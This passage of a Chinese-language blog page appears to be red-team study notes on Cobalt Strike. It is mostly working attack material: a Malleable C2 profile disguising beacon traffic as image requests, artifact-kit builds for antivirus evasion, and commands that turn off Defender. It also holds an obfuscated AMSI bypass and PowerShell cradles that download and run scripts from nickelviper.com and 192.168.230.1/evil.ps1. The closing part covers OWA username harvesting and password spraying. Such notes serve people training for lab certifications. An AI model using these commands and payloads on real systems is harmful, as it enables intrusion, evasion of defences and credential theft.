class="hljs-comment"># Read this blog - https://offensivedefence.co.uk/posts/making-amsi-jump/</span><br>				<br>				<span class="hljs-built_in">set</span> spawnto_x64 <span class="hljs-string">&quot;%windir%\\sysnative\\dllhost.exe&quot;</span>;<br>				<span class="hljs-comment">#set spawnto_x64 &quot;%windir%\\System32\\dllhost.exe&quot;;</span><br>        <span class="hljs-built_in">set</span> spawnto_x86 <span class="hljs-string">&quot;%windir%\\syswow64\\dllhost.exe&quot;</span>;<br>				<br>&#125;<br><br>http<span class="hljs-literal">-get</span> &#123;<br>	<span class="hljs-built_in">set</span> uri <span class="hljs-string">&quot;/cat.gif /image /pixel.gif /logo.gif&quot;</span>;<br><br>	client &#123;<br>        	<span class="hljs-comment"># customize client indicators</span><br>		header <span class="hljs-string">&quot;Accept&quot;</span> <span class="hljs-string">&quot;text/html,image/avif,image/webp,*/*&quot;</span>;<br>		header <span class="hljs-string">&quot;Accept-Language&quot;</span> <span class="hljs-string">&quot;en-US,en;q=0.5&quot;</span>;<br>		header <span class="hljs-string">&quot;Accept-Encoding&quot;</span> <span class="hljs-string">&quot;gzip, deflate&quot;</span>;<br>		header <span class="hljs-string">&quot;Referer&quot;</span> <span class="hljs-string">&quot;https://www.google.com&quot;</span>;<br><br>		<span class="hljs-keyword">parameter</span> <span class="hljs-string">&quot;utm&quot;</span> <span class="hljs-string">&quot;ISO-8898-1&quot;</span>;<br>		<span class="hljs-keyword">parameter</span> <span class="hljs-string">&quot;utc&quot;</span> <span class="hljs-string">&quot;en-US&quot;</span>;<br><br>		metadata&#123;<br>			base64;<br>			header <span class="hljs-string">&quot;Cookie&quot;</span>;<br>		&#125;<br>	&#125;<br><br>	server &#123;<br>		<span class="hljs-comment"># customize server indicators</span><br>		header <span class="hljs-string">&quot;Content-Type&quot;</span> <span class="hljs-string">&quot;image/gif&quot;</span>;<br>		header <span class="hljs-string">&quot;Server&quot;</span> <span class="hljs-string">&quot;Microsoft IIS/10.0&quot;</span>;	<br>		header <span class="hljs-string">&quot;X-Powered-By&quot;</span> <span class="hljs-string">&quot;ASP.NET&quot;</span>;	<br><br>		output&#123;<br>			prepend <span class="hljs-string">&quot;\x01\x00\x01\x00\x00\x02\x01\x44\x00\x3b&quot;</span>;<br>      prepend <span class="hljs-string">&quot;\xff\xff\xff\x21\xf9\x04\x01\x00\x00\x00\x2c\x00\x00\x00\x00&quot;</span>;<br>      prepend <span class="hljs-string">&quot;\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x80\x00\x00\x00\x00&quot;</span>;<br>			print;<br>		&#125;<br>	&#125;<br>&#125;<br><br>http<span class="hljs-literal">-post</span> &#123;<br>	<span class="hljs-built_in">set</span> uri <span class="hljs-string">&quot;/submit.aspx /finish.aspx&quot;</span>;<br><br>	client &#123;<br><br>		header <span class="hljs-string">&quot;Content-Type&quot;</span> <span class="hljs-string">&quot;application/octet-stream&quot;</span>;<br>		header <span class="hljs-string">&quot;Accept&quot;</span> <span class="hljs-string">&quot;text/html,image/avif,image/webp,*/*&quot;</span>;<br>		header <span class="hljs-string">&quot;Accept-Language&quot;</span> <span class="hljs-string">&quot;en-US,en;q=0.5&quot;</span>;<br>		header <span class="hljs-string">&quot;Accept-Encoding&quot;</span> <span class="hljs-string">&quot;gzip, deflate&quot;</span>;<br>		header <span class="hljs-string">&quot;Referer&quot;</span> <span class="hljs-string">&quot;https://www.google.com&quot;</span>;<br>		<br>		id&#123;<br>			<span class="hljs-keyword">parameter</span> <span class="hljs-string">&quot;id&quot;</span>;<br>		&#125;<br><br>		output&#123;<br>			print;<br>		&#125;<br><br>	&#125;<br><br>	server &#123;<br>		<span class="hljs-comment"># customize server indicators</span><br>		header <span class="hljs-string">&quot;Content-Type&quot;</span> <span class="hljs-string">&quot;text/plain&quot;</span>;<br>		header <span class="hljs-string">&quot;Server&quot;</span> <span class="hljs-string">&quot;Microsoft IIS/10.0&quot;</span>;	<br>		header <span class="hljs-string">&quot;X-Powered-By&quot;</span> <span class="hljs-string">&quot;ASP.NET&quot;</span>;	<br><br>		output&#123;<br>			netbios;<br>			prepend <span class="hljs-string">&quot;&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;&quot;</span>;<br>			append <span class="hljs-string">&quot;&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;&quot;</span>;<br>			print;<br>		&#125;<br>	&#125;<br>&#125;<br><br>http<span class="hljs-literal">-stager</span> &#123;<br><br>	server &#123;<br>		header <span class="hljs-string">&quot;Content-Type&quot;</span> <span class="hljs-string">&quot;application/octet-stream&quot;</span>;<br>		header <span class="hljs-string">&quot;Server&quot;</span> <span class="hljs-string">&quot;Microsoft IIS/10.0&quot;</span>;	<br>		header <span class="hljs-string">&quot;X-Powered-By&quot;</span> <span class="hljs-string">&quot;ASP.NET&quot;</span>;<br>	&#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<h3 id="设置-CS-监听器"><a href="#设置-CS-监听器" class="headerlink" title="设置 CS 监听器"></a>设置 CS 监听器</h3><ul>
<li><p>设置 SMB 侦听器</p>
<ul>
<li><p>默认管道名称签名很好。一个好的策略是模拟已知常用应用程序或 Windows 本身使用的名称。</p>
</li>
<li><p>用于 </p>
<figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livescript">PS C:<span class="hljs-string">\&gt;</span> ls <span class="hljs-string">\\.\pipe\</span><br></code></pre></td></tr></table></figure>

<p> 列出所有当前正在监听的管道以获得灵感。</p>
<ul>
<li><code>TSVCPIPE-4036c92b-65ae-4601-1337-57f7b24a0c57</code></li>
</ul>
</li>
</ul>
</li>
<li><p>设置 Pivot Listener</p>
<ul>
<li>Beacon_reverse_tcp 和 Beacon_Bind_Tcp 都是不同类型的监听器。</li>
<li>枢轴监听器只能通过信标创建。</li>
<li>创建 Pivot Listener 的步骤<ul>
<li>点击信标主机</li>
<li>选择 Pivoting &gt; Listener 并为其命名，其他选项保持不变（如果需要可进行修改）</li>
<li>现在，您可以在 Beacon 主机上检查 Beacon 进程是否已打开端口<ul>
<li><code>netstat -anop tcp | findstr &lt;PORT&gt;</code>其中 port 是枢轴侦听器端口</li>
</ul>
</li>
<li>现在转到有效载荷并生成任何有效载荷并选择 beacon_reverse_tcp 作为有效载荷监听器。</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="Defender-防病毒软件-AMSI"><a href="#Defender-防病毒软件-AMSI" class="headerlink" title="Defender 防病毒软件&#x2F;AMSI"></a>Defender 防病毒软件&#x2F;AMSI</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># Modifying Artifact Kit</span><br><span class="hljs-comment"># Modify script_template.cna and replace all instances of rundll32.exe with dllhost.exe</span><br><span class="hljs-built_in">PS</span> &gt; <span class="hljs-variable">$template_path</span>=<span class="hljs-string">&quot;C:\Tools\cobaltstrike\arsenal-kit\kits\artifact\script_template.cna&quot;</span> ; (<span class="hljs-built_in">Get-Content</span> <span class="hljs-literal">-Path</span> <span class="hljs-variable">$template_path</span>)  <span class="hljs-operator">-replace</span> <span class="hljs-string">&#x27;rundll32.exe&#x27;</span> ,  <span class="hljs-string">&#x27;dllhost.exe&#x27;</span> | <span class="hljs-built_in">Set-Content</span> <span class="hljs-literal">-Path</span> <span class="hljs-variable">$template_path</span><br><span class="hljs-comment"># Compile the Artifact kit (From WSL in Attacker windows Machine)</span><br><span class="hljs-variable">$</span> <span class="hljs-built_in">cd</span> /mnt/c/Tools/cobaltstrike/arsenal<span class="hljs-literal">-kit</span>/kits/artifact<br><span class="hljs-variable">$</span> ./build.sh pipe VirtualAlloc <span class="hljs-number">296948</span> <span class="hljs-number">5</span> false false none /mnt/c/Tools/cobaltstrike/artifacts<br><span class="hljs-comment"># Other Techniques are : mailslot, peek , pipe, readfile, readfile-v2</span><br><span class="hljs-comment"># Now load the artifact kit in cobalt strike (Cobalt Strike &gt; Script Manager &gt; Load)</span><br><span class="hljs-comment"># Now generate the payloads and test if these are getting detected, if they are detected by ThreatCheck , Follow the notes to modify the artifact kit code.</span><br><br><span class="hljs-comment"># Resource kit</span><br><span class="hljs-comment"># Compile the resource kit</span><br><span class="hljs-variable">$</span> <span class="hljs-built_in">cd</span> /mnt/c/Tools/cobaltstrike/arsenal<span class="hljs-literal">-kit</span>/kits/resource &amp;&amp; ./build.sh /mnt/c/Tools/cobaltstrike/resources<br><br><span class="hljs-comment"># Elevate kit</span><br><span class="hljs-comment"># Load Elevate kit in cobalt strike (manually or from script console)</span><br>aggressor&gt; load C:\Tools\cobaltstrike\elevate<span class="hljs-literal">-kit</span>\elevate.cna<br><br><span class="hljs-comment">#-----------------------------------------------------------------------------------</span><br><span class="hljs-comment"># To test AMSI, use the AMSI Test Sample PowerShell cmdlet.</span><br><span class="hljs-comment"># &quot;The term &#x27;AMSI&#x27; is not recognised&quot; refers that AMSI is not enabled, So either AMSI Bypass is working or Defender is not enabled.</span><br><span class="hljs-built_in">Invoke-Expression</span> <span class="hljs-string">&#x27;AMSI Test Sample: 7e72c3ce-861b-4339-8740-0ac1484c1386&#x27;</span><br><br><span class="hljs-comment"># To test on-disk detections, drop the EICAR test file somewhere such as the desktop.</span><br>X5O!P%@AP[<span class="hljs-number">4</span>\<span class="hljs-type">PZX54</span>(<span class="hljs-type">P</span>^)<span class="hljs-number">7</span><span class="hljs-type">CC</span>)<span class="hljs-number">7</span>&#125;<span class="hljs-variable">$EICAR</span>-<span class="hljs-type">STANDARD</span>-<span class="hljs-type">ANTIVIRUS</span>-<span class="hljs-built_in">TEST-FILE</span>!<span class="hljs-variable">$H</span>+<span class="hljs-type">H</span>*<br><br><span class="hljs-comment"># Verify if the payload is AV Safe</span><br><span class="hljs-type">PS</span>&gt; <span class="hljs-type">C</span>:\<span class="hljs-type">Tools</span>\<span class="hljs-type">ThreatCheck</span>\<span class="hljs-type">ThreatCheck</span>\<span class="hljs-type">ThreatCheck</span>\<span class="hljs-type">bin</span>\<span class="hljs-type">Release</span>\<span class="hljs-type">ThreatCheck.exe</span> -<span class="hljs-type">f</span> <span class="hljs-type">C</span>:\<span class="hljs-type">Payloads</span>\<span class="hljs-type">smb_x64.svc.exe</span> -<span class="hljs-type">e</span> <span class="hljs-type">AMSI</span><br><span class="hljs-type">PS</span>&gt; <span class="hljs-type">C</span>:\<span class="hljs-type">Tools</span>\<span class="hljs-type">ThreatCheck</span>\<span class="hljs-type">ThreatCheck</span>\<span class="hljs-type">bin</span>\<span class="hljs-type">Debug</span>\<span class="hljs-type">ThreatCheck.exe</span> -<span class="hljs-type">f</span> <span class="hljs-type">C</span>:\<span class="hljs-type">Payloads</span>\<span class="hljs-type">http_x64.exe</span> -<span class="hljs-type">e</span> <span class="hljs-type">AMSI</span><br><span class="hljs-comment"># One Liner to test all payloads for AV safe</span><br><span class="hljs-type">PS</span>&gt; <span class="hljs-built_in">Get-ChildItem</span> -<span class="hljs-type">Path</span> <span class="hljs-string">&quot;C:\Payloads\&quot;</span> -<span class="hljs-type">File</span> | <span class="hljs-built_in">ForEach-Object</span> &#123; &amp; <span class="hljs-type">echo</span> <span class="hljs-string">&quot;Testing file against ThreatCheck (AMSI): <span class="hljs-variable">$_</span>&quot;</span> ; <span class="hljs-type">C</span>:\<span class="hljs-type">Tools</span>\<span class="hljs-type">ThreatCheck</span>\<span class="hljs-type">ThreatCheck</span>\<span class="hljs-type">ThreatCheck</span>\<span class="hljs-type">bin</span>\<span class="hljs-type">Release</span>\<span class="hljs-type">ThreatCheck.exe</span> -<span class="hljs-type">e</span> <span class="hljs-type">AMSI</span> -<span class="hljs-type">f</span> <span class="hljs-variable">$_</span><span class="hljs-type">.FullName</span> &#125;<br><br><span class="hljs-comment"># Load the CNA file: Cobalt Strike &gt; Script Manager &gt; Load &gt; and select the CNA</span><br><span class="hljs-comment"># Use Payloads &gt; Windows Stageless Generate All Payloads to replace all of your payloads in `C:\Payloads`</span><br><br><span class="hljs-comment"># Disable AMSI in Malleable C2 profile</span><br><span class="hljs-variable">$</span> <span class="hljs-type">vim</span> <span class="hljs-type">c2</span>-<span class="hljs-type">profiles</span>/<span class="hljs-type">normal</span>/<span class="hljs-type">webbug.profile</span><br><br><span class="hljs-comment"># Right above the `http-get` block, add the following:</span><br><span class="hljs-type">post</span>-<span class="hljs-type">ex</span> &#123;<br>        <span class="hljs-type">set</span> <span class="hljs-type">amsi_disable</span> <span class="hljs-string">&quot;true&quot;</span>;<br>				<span class="hljs-type">set</span> <span class="hljs-type">spawnto_x64</span> <span class="hljs-string">&quot;%windir%\\sysnative\\dllhost.exe&quot;</span>;<br>				<span class="hljs-comment">#set spawnto_x64 &quot;%windir%\\System32\\dllhost.exe&quot;;</span><br>        <span class="hljs-type">set</span> <span class="hljs-type">spawnto_x86</span> <span class="hljs-string">&quot;%windir%\\syswow64\\dllhost.exe&quot;</span>;<br>&#125;<br><br><span class="hljs-comment"># Minimize the Behavioural Detections by modifying the Malleable c2 Profile</span><br><span class="hljs-type">stage</span> &#123;<br>        <span class="hljs-type">set</span> <span class="hljs-type">userwx</span> <span class="hljs-string">&quot;false&quot;</span>; <span class="hljs-comment">#Allocate Beacon DLL as RW/RX rather than RWX.</span><br>        <span class="hljs-type">set</span> <span class="hljs-type">cleanup</span> <span class="hljs-string">&quot;true&quot;</span>; <span class="hljs-comment">#Free memory associated with reflective loader after it has been loaded</span><br>        <span class="hljs-type">set</span> <span class="hljs-type">obfuscate</span> <span class="hljs-string">&quot;true&quot;</span>; <span class="hljs-comment"># Load Beacon into memory without its DLL headers</span><br>        <span class="hljs-type">set</span> <span class="hljs-type">module_x64</span> <span class="hljs-string">&quot;xpsservices.dll&quot;</span>; <span class="hljs-comment">#Load DLL from disk, then replace its memory with Beacon.</span><br>&#125;<br><br><span class="hljs-comment"># Verify the modified C2 profile</span><br><span class="hljs-type">attacker</span>@<span class="hljs-type">ubuntu</span> ~/<span class="hljs-type">cobaltstrike</span>&gt; <span class="hljs-type">.</span>/<span class="hljs-type">c2lint</span> <span class="hljs-type">c2</span>-<span class="hljs-type">profiles</span>/<span class="hljs-type">normal</span>/<span class="hljs-type">webbug.profile</span><br><br><span class="hljs-comment"># Creating custom C2 profiles</span><br><span class="hljs-type">https</span>://<span class="hljs-type">unit42.paloaltonetworks.com</span>/<span class="hljs-type">cobalt</span>-<span class="hljs-type">strike</span>-<span class="hljs-type">malleable</span>-<span class="hljs-type">c2</span>-<span class="hljs-type">profile</span>/<br><br><span class="hljs-comment"># Note: `amsi_disable` only applies to `powerpick`, `execute-assembly` and `psinject`.  It **does not** apply to the powershell command.</span><br><br><span class="hljs-comment"># Behaviour Detections (change default process for fork &amp; run)</span><br><span class="hljs-type">beacon</span>&gt; <span class="hljs-type">spawnto</span> <span class="hljs-type">x64</span> %<span class="hljs-type">windir</span>%\<span class="hljs-type">System32</span>\<span class="hljs-type">taskhostw.exe</span><br><span class="hljs-type">beacon</span>&gt; <span class="hljs-type">spawnto</span> <span class="hljs-type">x86</span> %<span class="hljs-type">windir</span>%\<span class="hljs-type">syswow64</span>\<span class="hljs-type">dllhost.exe</span><br><br><span class="hljs-type">beacon</span>&gt; <span class="hljs-type">spawnto</span> <span class="hljs-type">x64</span> %<span class="hljs-type">windir</span>%\<span class="hljs-type">System32</span>\<span class="hljs-type">dllhost.exe</span><br><span class="hljs-type">beacon</span>&gt; <span class="hljs-type">spawnto</span> <span class="hljs-type">x86</span> %<span class="hljs-type">windir</span>%\<span class="hljs-type">syswow64</span>\<span class="hljs-type">dllhost.exe</span><br><span class="hljs-type">beacon</span>&gt; <span class="hljs-type">powerpick</span> <span class="hljs-built_in">Get-Process</span> -<span class="hljs-type">Id</span> <span class="hljs-variable">$pid</span> | <span class="hljs-type">select</span> <span class="hljs-type">ProcessName</span><br><br><span class="hljs-comment"># Change the default process for psexec</span><br><span class="hljs-type">beacon</span>&gt; <span class="hljs-type">ak</span>-<span class="hljs-type">settings</span> <span class="hljs-type">spawnto_x64</span> <span class="hljs-type">C</span>:\<span class="hljs-type">Windows</span>\<span class="hljs-type">System32</span>\<span class="hljs-type">dllhost.exe</span><br><span class="hljs-type">beacon</span>&gt; <span class="hljs-type">ak</span>-<span class="hljs-type">settings</span> <span class="hljs-type">spawnto_x86</span> <span class="hljs-type">C</span>:\<span class="hljs-type">Windows</span>\<span class="hljs-type">SysWOW64</span>\<span class="hljs-type">dllhost.exe</span><br><br><span class="hljs-comment"># Disable Defender from local powershell session</span><br><span class="hljs-built_in">Get-MPPreference</span><br><span class="hljs-built_in">Set-MPPreference</span> -<span class="hljs-type">DisableRealTimeMonitoring</span> <span class="hljs-variable">$true</span><br><span class="hljs-built_in">Set-MPPreference</span> -<span class="hljs-type">DisableIOAVProtection</span> <span class="hljs-variable">$true</span><br><span class="hljs-built_in">Set-MPPreference</span> -<span class="hljs-type">DisableIntrusionPreventionSystem</span> <span class="hljs-variable">$true</span><br><br><span class="hljs-comment">## AMSI BYPASS -----------------------------------------------------------------</span><br><br><span class="hljs-comment"># AMSI BYPASS :  Use AMSI Bypass with powershell payload if required, </span><br><span class="hljs-comment"># Save below one liner to a ps1 file and host it on cobalt strike and use Powershell IEX to fetch and run it in memory to bypass AMSI.</span><br><br><span class="hljs-comment"># Malleable C2 amsi_disable does not applies to Cobalt Strike Jump Command, So some methods in jump command which uses Powershell like psexec_psh , winrm and winrm64 will not work if payload is detected, So we musty have to use Custom AMSI Bypass script to avoid that and get a shell.</span><br><span class="hljs-comment"># To make the jump command work and include amsi bypass into it, We need to modify the Resource kit&#x27;s template.x86.ps1 (for winrm), template.x64.ps1 (for winrm64) and compress.ps1 (for psexec_psh).</span><br><span class="hljs-comment"># To learn more , Read this blog - https://offensivedefence.co.uk/posts/making-amsi-jump/</span><br><br><span class="hljs-type">S</span>`e<span class="hljs-type">T</span>-<span class="hljs-type">It</span>`e<span class="hljs-type">m</span> ( <span class="hljs-string">&#x27;V&#x27;</span>+<span class="hljs-string">&#x27;aR&#x27;</span> +  <span class="hljs-string">&#x27;IA&#x27;</span> + (<span class="hljs-string">&#x27;blE:1&#x27;</span>+<span class="hljs-string">&#x27;q2&#x27;</span>)  + (<span class="hljs-string">&#x27;uZ&#x27;</span>+<span class="hljs-string">&#x27;x&#x27;</span>)  ) ( [<span class="hljs-type">TYpE</span>](  <span class="hljs-string">&quot;&#123;1&#125;&#123;0&#125;&quot;</span>-<span class="hljs-type">F</span><span class="hljs-string">&#x27;F&#x27;</span>,<span class="hljs-string">&#x27;rE&#x27;</span>  ) )  ;    (    <span class="hljs-built_in">Get-varI</span>`A`B<span class="hljs-type">LE</span>  ( (<span class="hljs-string">&#x27;1Q&#x27;</span>+<span class="hljs-string">&#x27;2U&#x27;</span>)  +<span class="hljs-string">&#x27;zX&#x27;</span>  )  -<span class="hljs-type">VaL</span>  )<span class="hljs-type">.</span><span class="hljs-string">&quot;A`ss`Embly&quot;</span><span class="hljs-type">.</span><span class="hljs-string">&quot;GET`TY`Pe&quot;</span>((  <span class="hljs-string">&quot;&#123;6&#125;&#123;3&#125;&#123;1&#125;&#123;4&#125;&#123;2&#125;&#123;0&#125;&#123;5&#125;&quot;</span> -<span class="hljs-type">f</span>(<span class="hljs-string">&#x27;Uti&#x27;</span>+<span class="hljs-string">&#x27;l&#x27;</span>),<span class="hljs-string">&#x27;A&#x27;</span>,(<span class="hljs-string">&#x27;Am&#x27;</span>+<span class="hljs-string">&#x27;si&#x27;</span>),(<span class="hljs-string">&#x27;.Man&#x27;</span>+<span class="hljs-string">&#x27;age&#x27;</span>+<span class="hljs-string">&#x27;men&#x27;</span>+<span class="hljs-string">&#x27;t.&#x27;</span>),(<span class="hljs-string">&#x27;u&#x27;</span>+<span class="hljs-string">&#x27;to&#x27;</span>+<span class="hljs-string">&#x27;mation.&#x27;</span>),<span class="hljs-string">&#x27;s&#x27;</span>,(<span class="hljs-string">&#x27;Syst&#x27;</span>+<span class="hljs-string">&#x27;em&#x27;</span>)  ) )<span class="hljs-type">.</span><span class="hljs-string">&quot;g`etf`iElD&quot;</span>(  ( <span class="hljs-string">&quot;&#123;0&#125;&#123;2&#125;&#123;1&#125;&quot;</span> -<span class="hljs-type">f</span>(<span class="hljs-string">&#x27;a&#x27;</span>+<span class="hljs-string">&#x27;msi&#x27;</span>),<span class="hljs-string">&#x27;d&#x27;</span>,(<span class="hljs-string">&#x27;I&#x27;</span>+<span class="hljs-string">&#x27;nitF&#x27;</span>+<span class="hljs-string">&#x27;aile&#x27;</span>)  ),(  <span class="hljs-string">&quot;&#123;2&#125;&#123;4&#125;&#123;0&#125;&#123;1&#125;&#123;3&#125;&quot;</span> -<span class="hljs-type">f</span> (<span class="hljs-string">&#x27;S&#x27;</span>+<span class="hljs-string">&#x27;tat&#x27;</span>),<span class="hljs-string">&#x27;i&#x27;</span>,(<span class="hljs-string">&#x27;Non&#x27;</span>+<span class="hljs-string">&#x27;Publ&#x27;</span>+<span class="hljs-string">&#x27;i&#x27;</span>),<span class="hljs-string">&#x27;c&#x27;</span>,<span class="hljs-string">&#x27;c,&#x27;</span>  ))<span class="hljs-type">.</span><span class="hljs-string">&quot;sE`T`VaLUE&quot;</span>(  <span class="hljs-variable">$</span>&#123;<span class="hljs-type">n</span>`U<span class="hljs-type">Ll</span>&#125;,<span class="hljs-variable">$</span>&#123;<span class="hljs-type">t</span>`R<span class="hljs-type">uE</span>&#125; ) ; <span class="hljs-built_in">Start-Job</span> -<span class="hljs-type">ScriptBlock</span>&#123;<span class="hljs-type">iex</span> (<span class="hljs-type">iwr</span> <span class="hljs-type">http</span>://<span class="hljs-type">nickelviper.com</span>/<span class="hljs-type">a</span> -<span class="hljs-type">UseBasicParsing</span>)&#125;<br><br><span class="hljs-comment"># Like below</span><br><br><span class="hljs-type">powershell.exe</span> -<span class="hljs-type">nop</span> -<span class="hljs-type">w</span> <span class="hljs-type">hidden</span> -<span class="hljs-type">c</span> <span class="hljs-string">&quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://nickelviper.com/amsi-bypass.ps1&#x27;)) ; IEX ((new-object net.webclient).downloadstring(&#x27;http://nickelviper.com/a&#x27;))&quot;</span><br><br><span class="hljs-comment"># It can also be combined with Macro</span><br><br><span class="hljs-comment"># Powershell Execute cradles</span><br><span class="hljs-type">iex</span> (<span class="hljs-built_in">New-Object</span> <span class="hljs-type">Net.WebClient</span>)<span class="hljs-type">.DownloadString</span>(<span class="hljs-string">&#x27;https://webserver/payload.ps1&#x27;</span>)<br><br><span class="hljs-type">powershell.exe</span> -<span class="hljs-type">nop</span> -<span class="hljs-type">w</span> <span class="hljs-type">hidden</span> -<span class="hljs-type">c</span> <span class="hljs-string">&quot;iex (iwr http://nickelviper.com/amsi-bypass.ps1 -UseBasicParsing)&quot;</span><br><br><span class="hljs-variable">$ie</span>=<span class="hljs-built_in">New-Object</span> -<span class="hljs-type">ComObject</span> <span class="hljs-built_in">Int</span><span class="hljs-type">ernetExplorer.Application</span>;<span class="hljs-variable">$ie</span><span class="hljs-type">.visible</span>=<span class="hljs-variable">$False</span>;<span class="hljs-variable">$ie</span><span class="hljs-type">.navigate</span>(<span class="hljs-string">&#x27;http://192.168.230.1/evil.ps1</span><br><span class="hljs-string">&#x27;</span>);<span class="hljs-type">sleep</span> <span class="hljs-number">5</span>;<span class="hljs-variable">$response</span>=<span class="hljs-variable">$ie</span><span class="hljs-type">.Document.body.innerHTML</span>;<span class="hljs-variable">$ie</span><span class="hljs-type">.quit</span>();<span class="hljs-type">iex</span> <span class="hljs-variable">$response</span><br><br><span class="hljs-type">PSv3</span> <span class="hljs-type">onwards</span><br><br><span class="hljs-type">iex</span> (<span class="hljs-type">iwr</span> <span class="hljs-string">&#x27;http://192.168.230.1/evil.ps1&#x27;</span>)<br><br><span class="hljs-variable">$h</span>=<span class="hljs-built_in">New-Object</span> -<span class="hljs-type">ComObject</span> <span class="hljs-type">Msxml2.XMLHTTP</span>;<span class="hljs-variable">$h</span><span class="hljs-type">.open</span>(<span class="hljs-string">&#x27;GET&#x27;</span>,<span class="hljs-string">&#x27;http://192.168.230.1/evil.ps1&#x27;</span>,<span class="hljs-variable">$false</span>);<span class="hljs-variable">$h</span><span class="hljs-type">.send</span>();<span class="hljs-type">iex</span> <span class="hljs-variable">$h</span><span class="hljs-type">.responseText</span><br><br><span class="hljs-variable">$wr</span> = [<span class="hljs-type">System.NET.WebRequest</span>]::<span class="hljs-type">Create</span>(<span class="hljs-string">&quot;http://192.168.230.1/evil.ps1&quot;</span>)<br><span class="hljs-variable">$r</span> = <span class="hljs-variable">$wr</span><span class="hljs-type">.GetResponse</span>()<br><span class="hljs-type">IEX</span> ([<span class="hljs-type">System.IO.StreamReader</span>](<span class="hljs-variable">$r</span><span class="hljs-type">.GetResponseStream</span>()))<span class="hljs-type">.ReadToEnd</span>()<br></code></pre></td></tr></table></figure>

<h3 id="最初的妥协"><a href="#最初的妥协" class="headerlink" title="最初的妥协"></a>最初的妥协</h3><ul>
<li>枚举OWA识别有效用户并进行密码喷洒攻击</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># Identify the mail server of given domain</span><br><span class="hljs-variable">$</span> dig cyberbotic.io<br><span class="hljs-variable">$</span> ./dnscan.py <span class="hljs-literal">-d</span> cyberbotic.io <span class="hljs-literal">-w</span> subdomains<span class="hljs-literal">-100</span>.txt<br><br><span class="hljs-comment"># Idenitfy the NETBIOS name of target domain</span><br><span class="hljs-built_in">ps</span>&gt; <span class="hljs-built_in">ipmo</span> C:\Tools\MailSniper\MailSniper.ps1<br><span class="hljs-built_in">ps</span>&gt; <span class="hljs-built_in">Invoke-DomainHarvestOWA</span> <span class="hljs-literal">-ExchHostname</span> mail.cyberbotic.io<br><br><span class="hljs-comment"># Extract Employee Names (FirstName LastName) and Prepare Username List</span><br><span class="hljs-variable">$</span> ~/namemash.py names.txt &gt; possible.txt<br><br><span class="hljs-comment"># Validate the username to find active/real usernames</span><br><span class="hljs-built_in">ps</span>&gt; <span class="hljs-built_in">Invoke-UsernameHarvestOWA</span> <span class="hljs-literal">-ExchHostname</span> mail.cyberbotic.io <span class="hljs-literal">-Domain</span> cyberbotic.io <span class="hljs-literal">-UserList</span> .\Desktop\possible.txt <span class="hljs-literal">-OutFile</span> .\Desktop\valid.txt<br><br><span class="hljs-comment"># Conduct Password Spraying attack with known Password on identified users</span><br><span class="hljs-built_in">ps</span>&gt; <span class="hljs-built_in">Invoke-PasswordSprayOWA</span> <span class="hljs-literal">-ExchHostname</span> mail.cyberbotic.io <span class="hljs-literal">-UserList</span> .\Desktop\valid.txt <span 